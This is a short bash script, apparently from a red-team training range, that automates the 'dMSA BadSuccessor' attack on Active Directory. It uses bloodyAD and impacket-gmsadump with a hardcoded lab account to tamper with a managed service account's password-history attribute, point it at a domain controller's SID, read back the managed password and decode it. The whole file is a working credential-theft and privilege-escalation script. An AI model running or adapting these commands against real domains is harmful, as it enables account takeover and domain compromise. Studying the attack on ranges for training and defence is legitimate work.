#!/bin/bash
# CADRE — WT#026 dMSA BadSuccessor
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#026 — dMSA BadSuccessor"
start_attack "026" "dMSA BadSuccessor"

require_tool bloodyAD
require_env DC03 "DC03"
require_env DOMAIN_EXT "DOMAIN_EXT"

step "Step 1: Set msDS-ManagedPasswordPreviousId to DC03 SID (rollback gMSA password)"
run_cmd "bloodyAD --host \"$DC03\" -d \"$DOMAIN_EXT\" -u adversary_lead -p 'Adv3rsary_L3ad!' set object \"CN=dmsaPrivService\$,OU=Adversary,DC=range,DC=local\" msDS-ManagedPasswordPreviousId -v \"<DC03_SID>\""

step "Step 2: Extract the rolled-back password"
run_cmd "bloodyAD --host \"$DC03\" -d \"$DOMAIN_EXT\" -u adversary_lead -p 'Adv3rsary_L3ad!' get object \"CN=dmsaPrivService\$,OU=Adversary,DC=range,DC=local\" --attr msDS-ManagedPassword"

step "Step 3: Decode the password blob"
run_cmd "impacket-gmsadump -dc-ip $DC03 \"$DOMAIN_EXT/adversary_lead:'Adv3rsary_L3ad!'\" dmsaPrivService\$"

result $? "dMSA BadSuccessor attack completed"
